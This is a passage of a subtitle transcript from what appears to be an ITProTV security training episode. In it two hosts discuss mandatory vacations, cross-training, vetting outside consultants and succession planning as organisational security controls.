to\n\n316\n00:16:24.043 --> 00:16:28.570\nkeep the system effective and\nefficient and working.\n\n317\n00:16:28.570 --> 00:16:32.095\nWhen we lose a critical\nmember of the team for\n\n318\n00:16:32.095 --> 00:16:35.921\nwhatever reason,\nbe it sickness or vacation.\n\n319\n00:16:35.921 --> 00:16:40.536\nOr the worst has happened and he was in\none of those cities where those guys with\n\n320\n00:16:40.536 --> 00:16:43.670\nthe missile keys were playing\naround with it [LAUGH].\n\n321\n00:16:43.670 --> 00:16:44.987\n&gt;&gt; One of the things I think of is,\n\n322\n00:16:44.987 --> 00:16:46.725\ncuz I'm a hardware guy, you know that.\n\n323\n00:16:46.725 --> 00:16:51.635\nI do a lot of the A+ training here too,\nI consider it kinda like RAID1.\n\n324\n00:16:51.635 --> 00:16:55.478\nFor the roles within your company that\nleads to a fault tolerance should one of\n\n325\n00:16:55.478 --> 00:16:58.728\nthose people that do or\nperform the roles that that job requires,\n\n326\n00:16:58.728 --> 00:17:00.520\nthey can't perform that role too.\n\n327\n00:17:00.520 --> 00:17:03.125\nSo tell me a little bit\nabout mandatory vacation.\n\n328\n00:17:03.125 --> 00:17:03.966\nWhat are we seeing or\n\n329\n00:17:03.966 --> 00:17:06.857\nwhat are we looking at, with that concept?\n&gt;&gt; Yeah, I bet everyone\n\n330\n00:17:06.857 --> 00:17:10.899\nthat saw that the first time was like,\nyeah, that's what I'm talking about.\n\n331\n00:17:10.899 --> 00:17:13.600\nMandatory vacation, you know it.\n\n332\n00:17:13.600 --> 00:17:15.250\nWell it is great, right?\n\n333\n00:17:15.250 --> 00:17:17.540\nThe fact that I will be given a vacation,\n\n334\n00:17:17.540 --> 00:17:22.040\nand not only that,\nI\"ll be mandatorily asked to take it.\n\n335\n00:17:22.040 --> 00:17:26.080\nThat I will need to, A, it's great for\nthe employees, it's just mental health\n\n336\n00:17:26.080 --> 00:17:30.040\nis a wonderful thing, and a lot of people\ncan get stressed out by their jobs.\n\n337\n00:17:30.040 --> 00:17:32.550\nSo what happens when you're stressed out?\n\n338\n00:17:32.550 --> 00:17:34.150\nYou make poor decisions.\n\n339\n00:17:34.150 --> 00:17:37.412\nSo helping alleviating stressed by\nsomeone getting away from work,\n\n340\n00:17:37.412 --> 00:17:38.825\nnot having to think about it.\n\n341\n00:17:38.825 --> 00:17:43.774\nAnd when we say mandatory vacations, we\nmean you are gone, you do not contact us,\n\n342\n00:17:43.774 --> 00:17:45.295\nwe will not contact you.\n\n343\n00:17:45.295 --> 00:17:49.891\nUnless it's some form of dire\nemergency that's personal to you,\n\n344\n00:17:49.891 --> 00:17:51.540\nnot about the company.\n\n345\n00:17:51.540 --> 00:17:54.560\nIf an emergency happens in this company,\nyou don't need to know about it,right?\n\n346\n00:17:54.560 --> 00:17:55.910\nThis is a mandatory vacation.\n\n347\n00:17:55.910 --> 00:17:58.670\nYou get away from things, you decompress,\n\n348\n00:17:58.670 --> 00:18:01.660\nand when you come back you're refreshed\nand you're ready to go back to work.\n\n349\n00:18:03.180 --> 00:18:04.837\nYou're making better decisions.\n\n350\n00:18:04.837 --> 00:18:07.626\nBecause a lot of people feel\noverwhelmed by their job.\n\n351\n00:18:07.626 --> 00:18:11.970\nSo just by the fact that your implementing\na mandatory vacation will help\n\n352\n00:18:11.970 --> 00:18:14.817\nhit that pressure release valve and\nhelp people\n\n353\n00:18:14.817 --> 00:18:19.650\nmake good decisions throughout their day.\n&gt;&gt; Mandatory vacation is it also about\n\n354\n00:18:19.650 --> 00:18:23.300\naccountability and auditing what maybe\nthat person has done maybe to and\n\n355\n00:18:23.300 --> 00:18:25.410\nwe're always gonna think of the bad.\n\n356\n00:18:25.410 --> 00:18:26.520\nI'm sorry, I'm a pessimist.\n\n357\n00:18:26.520 --> 00:18:27.950\nYou know we always think of the bad.\n\n358\n00:18:27.950 --> 00:18:30.914\nTo find out, has somebody been\nmaliciously using our systems?\n\n359\n00:18:30.914 --> 00:18:33.810\nBack to that term abuse that you\nused earlier, abusing the systems.\n\n360\n00:18:33.810 --> 00:18:35.640\nWhat have they done,\nlet's say, for the last year?\n\n361\n00:18:35.640 --> 00:18:37.160\n&gt;&gt; Yeah, that is the other side of\n\n362\n00:18:37.160 --> 00:18:39.441\nthe mandatory vacation coin\n&gt;&gt; Not just the fun part.\n\n363\n00:18:39.441 --> 00:18:41.015\n&gt;&gt; Yeah, not just the fact that\n\n364\n00:18:41.015 --> 00:18:43.149\nI get to go to the beach or\ngo climb a mountain or\n\n365\n00:18:43.149 --> 00:18:45.860\ndo whatever that helps\nme relieve my stress.\n\n366\n00:18:45.860 --> 00:18:49.691\nBut it also allows us as a company to see,\nhey,\n\n367\n00:18:49.691 --> 00:18:53.640\nhas my cross training\nprogram been effective?\n\n368\n00:18:53.640 --> 00:18:56.410\nBecause now I'm gonna to\nbring in my other person.\n\n369\n00:18:56.410 --> 00:18:58.940\nAnd when that person's there,\nthey're gonna be able to see\n\n370\n00:18:58.940 --> 00:19:04.250\nwhat the normal operator of that\nprocedure does, has been doing.\n\n371\n00:19:04.250 --> 00:19:07.300\nSo they're gonna go, why,\n\n372\n00:19:07.300 --> 00:19:11.700\nyou know I'm in the finance department and\nI don't understand what this account is.\n\n373\n00:19:13.570 --> 00:19:15.980\nIt's not in any of my documentation, but\n\n374\n00:19:15.980 --> 00:19:20.800\nI do see small increments of money being\ntransferred to it on a regular basis.\n\n375\n00:19:20.800 --> 00:19:23.050\nUp to maybe a couple of\nthousand dollars a month.\n\n376\n00:19:24.590 --> 00:19:26.090\nWhat is that, I don't see that?\n\n377\n00:19:26.090 --> 00:19:27.550\nAnd then they're able to report.\n\n378\n00:19:27.550 --> 00:19:30.520\nSo by the fact that that person\nis away from their normal duties,\n\n379\n00:19:30.520 --> 00:19:32.006\nthe normal person that does it.\n\n380\n00:19:32.006 --> 00:19:33.063\nIt does give us,\n\n381\n00:19:33.063 --> 00:19:37.370\nas an organization a good look into\nwhat they do on a day to day basis.\n\n382\n00:19:37.370 --> 00:19:41.030\nBecause someone who has no skin in\nthe game, is just going to come in and\n\n383\n00:19:41.030 --> 00:19:42.590\nbe able to spot irregularities.\n\n384\n00:19:43.600 --> 00:19:47.918\nAnd through those irregularities say well,\nmaybe this was accidental but\n\n385\n00:19:47.918 --> 00:19:50.122\nit really looks like an malfeasance.\n\n386\n00:19:50.122 --> 00:19:54.020\nIt looks intentional by\nthe way it's being performed.\n\n387\n00:19:54.020 --> 00:19:57.220\nSo we have a spot that so\nA keeps an honest man honest, or\n\n388\n00:19:57.220 --> 00:19:59.890\nan honest woman, honest.\n\n389\n00:19:59.890 --> 00:20:02.836\nThe temptation to do something wrong,\nyou know,\n\n390\n00:20:02.836 --> 00:20:05.442\nI'm gonna have to take\na vacation some day.\n\n391\n00:20:05.442 --> 00:20:08.214\nAnd when I do, someone's gonna come in and\ntake my place and\n\n392\n00:20:08.214 --> 00:20:11.280\nthey're gonna see this and\nI'm gonna be busted.\n\n393\n00:20:11.280 --> 00:20:16.269\nSo just that sense of maybe if given\nthe right circumstances I would of\n\n394\n00:20:16.269 --> 00:20:17.995\ndone something wrong.\n\n395\n00:20:17.995 --> 00:20:23.500\nBut because those circumstances\nhave been taken away from me.\n\n396\n00:20:23.500 --> 00:20:28.360\nI'm not going to be able to perform\nthat action, I'm not gonna do it, okay?\n\n397\n00:20:28.360 --> 00:20:32.059\nSo, but if they have done something\nnow we'll be able to see that.\n\n398\n00:20:32.059 --> 00:20:35.037\nWe'll be able to say hey you know,\nWes, we need you to have a talk in HR,\n\n399\n00:20:35.037 --> 00:20:37.300\nbecause we need you to\nanswer some questions.\n\n400\n00:20:37.300 --> 00:20:40.900\nWhile Susie here was taking over\nyour duties while you were gone,\n\n401\n00:20:40.900 --> 00:20:45.740\nshe noticed some irregularities\nin your day to day activities.\n\n402\n00:20:45.740 --> 00:20:46.720\nWhat are these emails?\n\n403\n00:20:46.720 --> 00:20:48.670\nWhat is this data that's being put here?\n\n404\n00:20:48.670 --> 00:20:51.918\nWhy are you emailing this out here,\ninstead of putting it into the system?\n\n405\n00:20:51.918 --> 00:20:52.580\nIt goes, here.\n\n406\n00:20:52.580 --> 00:20:53.692\nWhy aren't you using encryption?\n\n407\n00:20:53.692 --> 00:20:57.295\nOr maybe they were doing it accidentally,\nit could very well be.\n\n408\n00:20:57.295 --> 00:20:59.790\nBut if they weren't, they need to\nbe able to answer those questions.\n\n409\n00:20:59.790 --> 00:21:03.633\nAnd if they did do it accidentally,\nwe need to revisit our procedures and\n\n410\n00:21:03.633 --> 00:21:05.273\nfind out why that was unclear.\n\n411\n00:21:05.273 --> 00:21:08.799\nSo that they can better follow that and\nmake sure that they're being as\n\n412\n00:21:08.799 --> 00:21:11.379\nsecure as possible.\n&gt;&gt; And maybe if somebody's looking at this\n\n413\n00:21:11.379 --> 00:21:14.240\nfor the first time, and says now this\nstuff doesn't really happen, right?\n\n414\n00:21:14.240 --> 00:21:15.310\nThis is all theory.\n\n415\n00:21:15.310 --> 00:21:18.540\nYou can just check out any one\nof our Tweet posts out there,\n\n416\n00:21:18.540 --> 00:21:22.320\nwe're constantly looking at\narticles that this does happen.\n\n417\n00:21:22.320 --> 00:21:26.166\nYou get the disgruntled admin who\ngets passed up job promotion.\n\n418\n00:21:26.166 --> 00:21:29.890\nAnd says that's it I'm outta here and\nI'm not gonna tell you about the three or\n\n419\n00:21:29.890 --> 00:21:33.080\nfour backdoor administrative\naccounts that we've created.\n\n420\n00:21:33.080 --> 00:21:36.630\nNow we have some kind of accountability\nat least once a year that they're gonna\n\n421\n00:21:36.630 --> 00:21:38.900\nhave to explain, right?\n&gt;&gt; Yeah, exactly right.\n\n422\n00:21:38.900 --> 00:21:42.160\nSo, that's a really good\nreason that we want to\n\n423\n00:21:42.160 --> 00:21:44.520\nimplement a mandatory vacation cycle,\nright?\n\n424\n00:21:44.520 --> 00:21:49.190\nSo let's move on to consultance\nwhich is next on the list which is,\n\n425\n00:21:49.190 --> 00:21:51.590\nwell, it's outside, it's third party.\n\n426\n00:21:51.590 --> 00:21:52.870\nLet's bring in an expert.\n\n427\n00:21:52.870 --> 00:21:55.990\nThey're not an employee of the company,\nper say,\n\n428\n00:21:55.990 --> 00:22:00.940\nthey're like a subcontractor, so\nthey can do a specific job for us.\n\n429\n00:22:00.940 --> 00:22:02.980\nWell, what's so great about that?\n\n430\n00:22:02.980 --> 00:22:05.440\nA, they are an expert, right?\n\n431\n00:22:05.440 --> 00:22:06.580\nSo that's great.\n\n432\n00:22:06.580 --> 00:22:10.320\nMaybe Wes and I, we've been with\nthe company since day one and\n\n433\n00:22:10.320 --> 00:22:10.980\nwe're just the IT guys.\n\n434\n00:22:10.980 --> 00:22:13.163\nWe've always been the IT guys,\nbecause we always had a head for it.\n\n435\n00:22:13.163 --> 00:22:16.600\nBut we weren't formally trained,\nwe've learned as we gone.\n\n436\n00:22:16.600 --> 00:22:17.600\nWe've done a great job.\n\n437\n00:22:17.600 --> 00:22:22.080\nThe company values us as employees,\nand as their IT personnel.\n\n438\n00:22:22.080 --> 00:22:25.810\nBut they also understand we're\nnot experts, and that, right?\n\n439\n00:22:25.810 --> 00:22:28.560\nThey're loyal to us, and\nwe're loyal to them, that's great.\n\n440\n00:22:28.560 --> 00:22:31.210\nBut we also recognize,\nwe're not experts at that.\n\n441\n00:22:31.210 --> 00:22:32.850\nWe'll try to learn anything\nyou want us to learn, and\n\n442\n00:22:32.850 --> 00:22:38.610\nthen this is a very common scenario\nthroughout many, many business.\n\n443\n00:22:38.610 --> 00:22:42.510\nThey start small and they just work their\nway up and they deal with what they have.\n\n444\n00:22:42.510 --> 00:22:45.750\nAnd people learn as they go and\nthat that's great to be honest with you,\n\n445\n00:22:45.750 --> 00:22:47.318\nit's a really phenomenal thing.\n\n446\n00:22:47.318 --> 00:22:50.550\nI've been a part of teams like that where\nsomeone threw me something and said, hey,\n\n447\n00:22:50.550 --> 00:22:51.460\nlearn this.\n\n448\n00:22:51.460 --> 00:22:53.680\nI go, okay, I can do that.\n\n449\n00:22:53.680 --> 00:22:56.390\nBut I wasn't an expert on it, so\nif anything went wrong or anything,\n\n450\n00:22:56.390 --> 00:22:57.750\nI would have to consult experts.\n\n451\n00:22:57.750 --> 00:23:02.110\nSo a lot of times you'll bring in\nconsultants to help with that or\n\n452\n00:23:02.110 --> 00:23:04.070\nto implement certain things.\n\n453\n00:23:04.070 --> 00:23:08.590\nAnd it's easy to think, well we've got the\nconsultant, now it's their problem, right?\n\n454\n00:23:08.590 --> 00:23:12.540\nAnd it's not ours anymore,\nit's still yours, right?\n\n455\n00:23:12.540 --> 00:23:16.640\nWhat's their problem is to do the job\nthat you've had them to do, right?\n\n456\n00:23:16.640 --> 00:23:20.613\nBut when you do bring third party]\nconsultants, have you thought about, well,\n\n457\n00:23:20.613 --> 00:23:22.870\nyeah they could be best\nthings in slice bread.\n\n458\n00:23:22.870 --> 00:23:24.822\nYour savior from on high,\n\n459\n00:23:24.822 --> 00:23:30.236\nhas it come to fix whatever issue it\nis because they have the knowledge and\n\n460\n00:23:30.236 --> 00:23:34.960\ntools necessary to do that, and\nwe didn't, but who are they?\n\n461\n00:23:34.960 --> 00:23:38.910\nHave you done any kind of\ninvestigative look into that person?\n\n462\n00:23:38.910 --> 00:23:41.530\nYou probably need to be doing that.\n&gt;&gt; You're part of a company right now\n\n463\n00:23:41.530 --> 00:23:42.420\nthat's done that, right?\n\n464\n00:23:42.420 --> 00:23:44.352\nYou've been here since the very,\nvery beginning of ITProTV.\n\n465\n00:23:44.352 --> 00:23:45.338\n&gt;&gt; That's exactly right.\n\n466\n00:23:45.338 --> 00:23:46.701\n&gt;&gt; And I can't tell you one department\n\n467\n00:23:46.701 --> 00:23:49.574\nthat we have in here that we haven't\ndone some kind of outside consultant.\n\n468\n00:23:49.574 --> 00:23:51.303\nCuz when we started, we were small.\n&gt;&gt; Yep.\n\n469\n00:23:51.303 --> 00:23:52.026\n&gt;&gt; And we don't know.\n\n470\n00:23:52.026 --> 00:23:53.985\nAs we grew,\nwe didn't know what we didn't know.\n\n471\n00:23:53.985 --> 00:23:55.682\nAnd that also goes from the security side,\nright?\n\n472\n00:23:55.682 --> 00:23:58.545\nRight, stress testing and fuzzing, and\ndoing all the stuff that we need to do\n\n473\n00:23:58.545 --> 00:24:01.595\nthat makes up a great up a great\npen-test against some of our systems.\n\n474\n00:24:01.595 --> 00:24:03.360\nBecause again, we're not aware\nof what we're not aware of.\n\n475\n00:24:03.360 --> 00:24:05.960\nSo you bring those people in\nfrom the outside, Dan, and\n\n476\n00:24:05.960 --> 00:24:09.530\njust like you said,\ndon't be afraid to say I don't know.\n\n477\n00:24:09.530 --> 00:24:11.350\nCuz if you say you know and\nyou don't know,\n\n478\n00:24:11.350 --> 00:24:13.440\nyou're gonna be held accountable,\neven if you don't know it.\n\n479\n00:24:13.440 --> 00:24:18.460\nSo it's nice to get that expert opinion,\nescalate it to somebody who does have that\n\n480\n00:24:18.460 --> 00:24:20.390\nexpertise.\n&gt;&gt; Exactly, and\n\n481\n00:24:20.390 --> 00:24:23.120\nthen once you've decided to bring in\nthose consultants and say, you know what,\n\n482\n00:24:23.120 --> 00:24:27.030\nwe need that expert,\nbe performing background checks on them,\n\n483\n00:24:27.030 --> 00:24:29.620\ninvestigate them,\nsee does their company have a good rating.\n\n484\n00:24:29.620 --> 00:24:31.380\nDo they have good reviews?\n\n485\n00:24:31.380 --> 00:24:32.420\nHave they shown themselves?\n\n486\n00:24:32.420 --> 00:24:35.440\nDo they have any kinda certification\nthat would prove that they\n\n487\n00:24:35.440 --> 00:24:37.650\nare a trustworthy entity?\n\n488\n00:24:37.650 --> 00:24:41.426\nDo that homework before you bring\nsomeone from the outside in.\n\n489\n00:24:41.426 --> 00:24:44.308\nAnd this should be done on any\nnew employee that you hire,\n\n490\n00:24:44.308 --> 00:24:47.011\nthat's kind of a consultant,\nto be honest with you,\n\n491\n00:24:47.011 --> 00:24:50.070\nbut still,\nbackground checks can help with that.\n\n492\n00:24:50.070 --> 00:24:53.170\nThen once that trust\nrelationship is set up,\n\n493\n00:24:53.170 --> 00:24:58.710\nmake sure that you are communicating with\nthem in a trustworthy way, use encryption.\n\n494\n00:24:58.710 --> 00:25:01.760\nIf there's any kind of network\nconnectivity between their system and\n\n495\n00:25:01.760 --> 00:25:06.600\nours, Federated Services, make sure\nmaybe VPN or is it encrypted end-to-end.\n\n496\n00:25:06.600 --> 00:25:08.870\nSo that any data that\ngoes between them and us,\n\n497\n00:25:08.870 --> 00:25:11.570\nwe haven't sign non-disclosure agreements,\nso\n\n498\n00:25:11.570 --> 00:25:14.550\nthat they can't speak about the work\nthat they're doing for your company.\n\n499\n00:25:14.550 --> 00:25:19.170\nThis is all standard fare, but\nit's things we have to think about because\n\n500\n00:25:19.170 --> 00:25:23.322\nif you're new to it, well, it's kinda what\nwe're talking about, if it's something\n\n501\n00:25:23.322 --> 00:25:26.270\nyou've never seen before, you gotta\nknow exactly what it is you gotta do so\n\n502\n00:25:26.270 --> 00:25:29.450\nthat you can perform the activity.\n\n503\n00:25:29.450 --> 00:25:30.547\nWhat else?\nUse encryption.\n\n504\n00:25:30.547 --> 00:25:33.410\nWhat about shared or\ndedicated storage, right?\n\n505\n00:25:33.410 --> 00:25:36.780\nAm I sending data from\nmy system into theres?\n\n506\n00:25:36.780 --> 00:25:39.080\nAnd if so, is that being encrypted?\n\n507\n00:25:39.080 --> 00:25:41.740\nAnd if so, when it gets off the wire and\n\n508\n00:25:41.740 --> 00:25:44.330\ninto a rest state,\nis that being encrypted?\n\n509\n00:25:44.330 --> 00:25:47.472\nIs that being shared with other\npeople that they're consulting with,\n\n510\n00:25:47.472 --> 00:25:48.790\nother companies?\n\n511\n00:25:48.790 --> 00:25:52.320\nAm I sharing resources, memory,\nhard drive CPU, that kinda stuff?\n\n512\n00:25:52.320 --> 00:25:54.010\nIs it virtualization, what's going on?\n\n513\n00:25:54.010 --> 00:25:55.470\nHow does this look?\n\n514\n00:25:55.470 --> 00:25:59.950\nAnd if so, what kind of compensating\ncontrols are you engaging in, and\n\n515\n00:25:59.950 --> 00:26:05.130\nsecurity in systems are you engaging in\nto verify that my data will remain safe?\n\n516\n00:26:05.130 --> 00:26:08.780\nIt does end up at the end of\nthe day being a trust thing\n\n517\n00:26:08.780 --> 00:26:14.030\nwhere I've decided to trust you\nbased off of x, y, and z factors.\n\n518\n00:26:14.030 --> 00:26:18.192\nThis is a, I like to use the word faith,\nwe have faith in them,\n\n519\n00:26:18.192 --> 00:26:23.098\nconfidence, which is Latin confide,\nwhich means with faith, right?\n\n520\n00:26:23.098 --> 00:26:29.132\nI'm extending my faith to that you will be\ntreating my data like it was your own and\n\n521\n00:26:29.132 --> 00:26:33.747\ntrying to keep it as safe as\npossible if I've decided to engage\n\n522\n00:26:33.747 --> 00:26:37.870\nin an arranged consulting\nagreement with you, okay?\n\n523\n00:26:37.870 --> 00:26:41.821\nAnd that's what the SLA is for, to make\nsure that they fulfill their end of\n\n524\n00:26:41.821 --> 00:26:45.838\nthat bargain, and if they don't,\nthere will be repercussions for that,\n\n525\n00:26:45.838 --> 00:26:49.060\nwhatever is laid out in that SLA,\nso just keep that in mind.\n\n526\n00:26:49.060 --> 00:26:51.730\nAnd then I think, yeah,\nI did wanna do this.\n\n527\n00:26:51.730 --> 00:26:55.970\nEmployee hiring standards, I'm not talking\nabout our employee hiring standards.\n\n528\n00:26:55.970 --> 00:26:59.300\nWhat's my consultant's hiring standards?\n\n529\n00:26:59.300 --> 00:27:00.900\nAre they doing background checks?\n\n530\n00:27:00.900 --> 00:27:02.265\nAre they looking into this?\n\n531\n00:27:02.265 --> 00:27:06.196\nDo they have the proper\nrequisite certification and\n\n532\n00:27:06.196 --> 00:27:11.390\ntrustworthiness before they're\nhired into your systems, right?\n\n533\n00:27:11.390 --> 00:27:15.490\nSo what's the incident response?\n\n534\n00:27:15.490 --> 00:27:17.800\nIf something happens, will I be notified?\n\n535\n00:27:17.800 --> 00:27:20.150\nAnd if so, when and how?\n\n536\n00:27:20.150 --> 00:27:21.760\nHow's that look?\n\n537\n00:27:21.760 --> 00:27:24.220\nAgain, usually within the SLA agreement,\nso\n\n538\n00:27:24.220 --> 00:27:27.410\nyou have to read those things kinda\ncarefully so that you know what\n\n539\n00:27:27.410 --> 00:27:32.990\nto expect from your consultant systems,\nor your consultant agencies, or people.\n\n540\n00:27:32.990 --> 00:27:36.835\nCuz if you don't know, then it could\nhappen and they just get away with it, and\n\n541\n00:27:36.835 --> 00:27:39.303\nnot that they're trying to,\nbut it could occur.\n\n542\n00:27:39.303 --> 00:27:42.868\nAll right, let's move on to succession\nplanning, and then looks like we've got\n\n543\n00:27:42.868 --> 00:27:46.202\njust a few more minutes in this episode\nand we'll have to go for a part three.\n\n544\n00:27:46.202 --> 00:27:50.920\nBut succession planning is basically\nhow do I handle losing a key employee?\n\n545\n00:27:50.920 --> 00:27:53.465\nThis is a manager, a supervisor, or\n\n546\n00:27:53.465 --> 00:27:57.270\nsomeone that performs\na very specialized task.\n\n547\n00:27:57.270 --> 00:28:01.756\nSo again, we go back to the idea\nof Wes is the webmaster and\n\n548\n00:28:01.756 --> 00:28:05.503\nhe die, or he quits, or\nwe fire him, what now?\n\n549\n00:28:05.503 --> 00:28:06.990\nHow do we handle that?\n\n550\n00:28:06.990 --> 00:28:09.140\nWhat we do?\n\n551\n00:28:10.430 --> 00:28:14.723\nSo this definitely brings up\nthe importance of cross-training,\n\n552\n00:28:14.723 --> 00:28:16.723\nit's a very important thing.\n\n553\n00:28:16.723 --> 00:28:20.720\nNow, if I have a backup for\nWes, Wes can quit all he wants.\n\n554\n00:28:20.720 --> 00:28:23.660\nHe can demand more money and me go,\nman, I just don't have it to give or\n\n555\n00:28:23.660 --> 00:28:24.800\nI don't think you're worth it.\n\n556\n00:28:24.800 --> 00:28:26.114\nAnd he can say, sayonara.\n\n557\n00:28:26.114 --> 00:28:28.070\nAnd we're like,\ndon't let the door hit you.\n\n558\n00:28:28.070 --> 00:28:32.000\nAnd now Bobby comes up and\nhe takes over Wes' duties.\n\n559\n00:28:32.000 --> 00:28:35.050\nSo having someone cross-trained for\nthat position.\n\n560\n00:28:35.050 --> 00:28:41.870\nIt is difficult when you're talking about\nmanagers and supervisors, specific ones,\n\n561\n00:28:41.870 --> 00:28:47.680\nbut you do want to get someone who's\ninvolved in their day-to-day operations.\n\n562\n00:28:47.680 --> 00:28:50.320\nSo at least they're familiar in some way,\nshape and\n\n563\n00:28:50.320 --> 00:28:56.245\nform on how they perform their duties and\ncould fill in the gap witnessed here.\n\n564\n00:28:56.245 --> 00:28:58.850\nIf we've done our proper\ncross-training and we're implementing\n\n565\n00:28:58.850 --> 00:29:02.980\nmandatory vacations, we're probably\nhaving to do this once a year anyway.\n\n566\n00:29:02.980 --> 00:29:06.780\nSo it should just be basically\na lather-rinse-repeat\n\n567\n00:29:06.780 --> 00:29:09.900\non a permanent basis until we find\na replacement that can come in.\n\n568\n00:29:09.900 --> 00:29:11.140\n&gt;&gt; Can you give me an example of maybe\n\n569\n00:29:11.140 --> 00:29:14.230\npotential results of maybe not doing this?\n\n570\n00:29:14.230 --> 00:29:15.440\nIf we did lose that employee,\n\n571\n00:29:15.440 --> 00:29:17.640\nwhat might happen?\n&gt;&gt; Yeah, we're gonna running around\n\n572\n00:29:17.640 --> 00:29:20.460\nwith that decapitated poultry\nsyndrome happening, right?\n\n573\n00:29:20.460 --> 00:29:21.190\nWhat do we do?\n\n574\n00:29:21.190 --> 00:29:22.180\nI don't know.\n\n575\n00:29:22.180 --> 00:29:23.340\nWell, do we have a procedure?\n\n576\n00:29:23.340 --> 00:29:24.752\nNo, should have done that.\n\n577\n00:29:24.752 --> 00:29:26.560\nAll right, that's what this is.\n\n578\n00:29:26.560 --> 00:29:30.890\nWhen you go into succession planning,\nyou're creating a plan, right?\n\n579\n00:29:30.890 --> 00:29:32.890\nYou're gonna document all of this stuff.\n\n580\n00:29:32.890 --> 00:29:36.190\nEvery topic that we've been talking\nabout needs to be thoroughly documented,\n\n581\n00:29:36.190 --> 00:29:38.880\nput in the employee handbook somewhere\nwhere they can get a hold of it.\n\n582\n00:29:38.880 --> 00:29:41.510\nAnd everybody knows what is happening,\nright?\n\n583\n00:29:41.510 --> 00:29:45.580\nIt's gonna be a part of your\nday-to-day life, right?\n\n584\n00:29:45.580 --> 00:29:48.350\nSo when you're performing this,\n\n585\n00:29:48.350 --> 00:29:53.130\nthere should be a playbook that says,\nwe just lost a key person.\n\n586\n00:29:53.130 --> 00:29:57.050\nNow, if we know they're gonna retire,\nthat's a different story,\n\n587\n00:29:57.050 --> 00:29:58.250\nthat's very helpful.\n\n588\n00:29:58.250 --> 00:30:02.320\nBecause now we can have someone\ncross-train if we haven't done that\n\n589\n00:30:02.320 --> 00:30:06.668\nalready and be able to take over, or\nwe can start the hiring process before\n\n590\n00:30:06.668 --> 00:30:10.901\nthey retire and then go, instead of going,\nwell, Wes retired today.\n\n591\n00:30:10.901 --> 00:30:14.648\nHe walked in, and we gave him a gold\nwatch, and patted him on the head, and\n\n592\n00:30:14.648 --> 00:30:16.106\nsaid, thanks for helping.\n\n593\n00:30:16.106 --> 00:30:17.280\nAnd now what do we do?\n\n594\n00:30:17.280 --> 00:30:19.250\nWell, I guess we'd better\nstart hiring someone.\n\n595\n00:30:19.250 --> 00:30:21.040\nI guess it's probably a good idea.\n\n596\n00:30:22.060 --> 00:30:23.260\nYou don't want it to be that way.\n\n597\n00:30:23.260 --> 00:30:26.850\nYou want it to be very well laid out and\nplanned and strategically done so\n\n598\n00:30:26.850 --> 00:30:30.770\nthat when someone retires, fires, quits,\n\n599\n00:30:30.770 --> 00:30:35.580\nor something worse happens,\nthat's not a game-changer,\n\n600\n00:30:35.580 --> 00:30:40.380\nit's not a conversation-stopper when\nit comes to business continuity.\n\n601\n00:30:40.380 --> 00:30:42.220\nThat person has been cross-trained,\nhe's gonna come right in and\n\n602\n00:30:42.220 --> 00:30:47.590\nbe able to take over those duties,\nand make sure that important tasks\n\n603\n00:30:47.590 --> 00:30:50.890\nthat need to be done within the\norganization are not being neglected or\n\n604\n00:30:50.890 --> 00:30:54.210\noverlooked, or not done at all, right?\n\n605\n00:30:54.210 --> 00:30:57.320\nAnd then keep that business going\nbecause if they get neglected or\n\n606\n00:30:57.320 --> 00:30:59.830\noverlooked, then you're opening\nyourself up for and attack.\n\n607\n00:30:59.830 --> 00:31:04.360\nBecause maybe Wes was, like I said, that\nwebsite guy and he's been performing all\n\n608\n00:31:04.360 --> 00:31:08.480\nthe updates on the web service that's\nrunning, that runs the website.\n\n609\n00:31:08.480 --> 00:31:11.900\nNow Wes is gone, I've actually seen this,\ndid it for local law enforcement,\n\n610\n00:31:11.900 --> 00:31:14.060\nthat the guy who was running\ntheir email server and he quit.\n\n611\n00:31:14.060 --> 00:31:16.640\nAnd they called us to say, hey guys,\nhave anybody that know Linux?\n\n612\n00:31:16.640 --> 00:31:20.800\nCuz this is a Linux server.\n\n613\n00:31:20.800 --> 00:31:23.059\nI had to go in there, by the way,\nyou've been attacked,\n\n614\n00:31:23.059 --> 00:31:25.070\nI saw indicators compromised.\n\n615\n00:31:25.070 --> 00:31:27.440\nAnd they were like, well we didn't\nhave anybody that knew this system, so\n\n616\n00:31:27.440 --> 00:31:29.940\nwe just kept going.\n\n617\n00:31:29.940 --> 00:31:32.475\nHad they had someone who have\nbeen cross-trained on that and\n\n618\n00:31:32.475 --> 00:31:37.070\nthey'd had prepared for that eventuality,\nthen they wouldn't have been caught with\n\n619\n00:31:37.070 --> 00:31:41.340\ntheir pants on as they were because\nthat person would have stepped in and\n\n620\n00:31:41.340 --> 00:31:42.110\ntaken over those roles.\n\n621\n00:31:42.110 --> 00:31:46.004\nAnd it wouldn't have been neglected,\nupdates would have been applied, that\n\n622\n00:31:46.004 --> 00:31:49.471\nsystem would have been much more secure.\n&gt;&gt; One of the other hosts here,\n\n623\n00:31:49.471 --> 00:31:52.452\neducators that we have at ITProTV,\nwhose name I won't say,\n\n624\n00:31:52.452 --> 00:31:54.785\nit kinda rhymes with Don Pezet.\n&gt;&gt; [LAUGH]\n\n625\n00:31:54.785 --> 00:31:55.990\n&gt;&gt; But he was saying that in one of\n\n626\n00:31:55.990 --> 00:31:57.180\nthe companies that he worked for,\n\n627\n00:31:57.180 --> 00:32:00.510\none of the first things that he had to\ndo once he knew what his job role was is\n\n628\n00:32:00.510 --> 00:32:05.690\nliterally record a video of every bit\nof the step by steps of what they did.\n\n629\n00:32:05.690 --> 00:32:09.680\nAnd every key position, the people\nthat were filling those roles had to\n\n630\n00:32:09.680 --> 00:32:14.610\nthroughly document and even make videos\nof step-by-step process of what they did.\n\n631\n00:32:14.610 --> 00:32:15.370\nSecession planning.\n\n632\n00:32:15.370 --> 00:32:19.700\nSo that if Don, God forbid,\ngets hurt, can't perform those roles,\n\n633\n00:32:19.700 --> 00:32:23.110\nsomebody can jump in really quick,\nprobably already cross-trained\n\n634\n00:32:23.110 --> 00:32:26.280\nto begin with, but if they don't know\nthe specifics, they can get very specific.\n\n635\n00:32:26.280 --> 00:32:29.680\nNow, specifically, let's see how many\ntimes I can say that here in a couple of\n\n636\n00:32:29.680 --> 00:32:32.920\nseconds, it does look like we're coming\nto the end of another great episode, but\n\n637\n00:32:32.920 --> 00:32:37.040\nI know you've got a lot more great content\nto come in this thought process here.\n\n638\n00:32:37.040 --> 00:32:41.570\nSo what do you say, Dan, we go ahead and\nwe'll take not a TV time out, but\n\n639\n00:32:41.570 --> 00:32:43.550\nwe'll go ahead and\njust pause this conversation for now and\n\n640\n00:32:43.550 --> 00:32:45.252\nwe'll come back in a part 